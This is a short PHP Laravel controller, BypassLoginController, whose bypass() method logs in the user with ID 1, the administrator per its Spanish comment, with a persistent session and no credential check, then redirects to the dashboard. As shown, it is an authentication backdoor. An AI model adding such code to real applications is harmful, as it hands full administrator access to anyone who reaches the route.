<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\Usuario;

class BypassLoginController extends Controller
{
    public function bypass()
    {
        // Fuerza el inicio de sesión del administrador (ID 1)
        $admin = Usuario::find(1);
        if ($admin) {
            Auth::login($admin, true);
            return redirect()->route('dashboard');
        }
        return "No se pudo encontrar al administrador.";
    }
}
